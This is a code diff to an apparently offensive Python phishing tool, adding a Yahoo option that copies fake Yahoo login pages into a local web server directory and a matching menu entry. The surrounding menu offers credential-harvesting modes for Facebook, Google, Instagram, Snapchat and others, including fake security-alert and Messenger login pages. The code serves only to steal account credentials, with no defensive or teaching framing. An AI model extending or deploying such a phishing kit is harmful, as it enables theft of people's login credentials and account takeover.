@@ -99,6 +99,8 @@ def runPhishing(social, option2):
         system('cp WebPages/twitter/*.* Server/www/')
     elif social == 'Snapchat':
         system('cp WebPages/Snapchat_web/*.* Server/www/')
+    elif social == 'Yahoo':
+        system('cp WebPages/yahoo_web/*.* Server/www/')
     elif option2 == '1' and social == 'Instagram':
         system('cp WebPages/Instagram_web/*.* Server/www/')    
     elif option2 == '2' and social == 'Instagram':
@@ -165,7 +167,7 @@ def runPEnv():
         system('clear')
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
         exit(0)
-    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
+    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
@@ -201,7 +203,11 @@ def runPEnv():
     elif option == '9':
         loadModule('Snapchat')
         option2 = ''
-        runPhishing('Snapchat', option2)    
+        runPhishing('Snapchat', option2)
+    elif option == '10':
+        loadModule('Yahoo')
+        option2 = ''
+        runPhishing('Yahoo', option2)    
     else:
         exit(0)
 
